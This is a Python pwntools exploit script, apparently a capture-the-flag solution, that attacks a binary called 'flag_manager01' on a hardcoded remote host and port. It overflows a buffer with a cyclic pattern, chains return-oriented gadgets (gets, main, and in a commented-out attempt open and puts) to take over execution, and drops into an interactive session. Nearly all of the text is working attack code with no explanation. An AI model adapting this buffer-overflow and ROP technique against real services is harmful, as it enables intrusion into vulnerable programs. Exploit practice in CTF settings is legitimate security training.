#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

# Pwntools custom functions
context.terminal = ['tmux', 'split', '-h']
def _snd(s):
  io.send(str(s))
def _sndl(s):
  io.sendline(str(s))
def _snda(a,s):
  io.sendafter(str(a),str(s))
def _sndal(a,s):
  io.sendlineafter(str(a),str(s))
def _rcvu(s):
  return io.recvuntil(str(s))
def _rcva():
  return io.recvall()
def _rcvn(n):
  return io.recv(n)

exe = context.binary = ELF('flag_manager01')

host = args.HOST or '89.38.208.144'
port = int(args.PORT or 11115)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x0400831
break *0x4007BF
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
"""
rbp = 0x601140
rop = ROP(exe)
rop.open(0x601100, 0)
rop.gets(rbp - 4)
rop.raw(0x4007BF)

_sndal(':', cyclic(80) + pack(rbp) + rop.chain())
_sndal(':', '000')

rop = ROP(exe)
rop.puts(rbp - 0x90)

_rcvu('OOO!\n')
_sndal('\n', pack(0x4) + cyclic(4) + rop.chain())
"""

rop = ROP(exe)
rop.gets(0x601060)
rop.main()

_sndal(':', cyclic(88) + rop.chain())
_sndal(':', '000')
_sndal('!', '12345\x00')
_sndal(':', 'misu')
_sndal(':', '12345')

io.interactive()

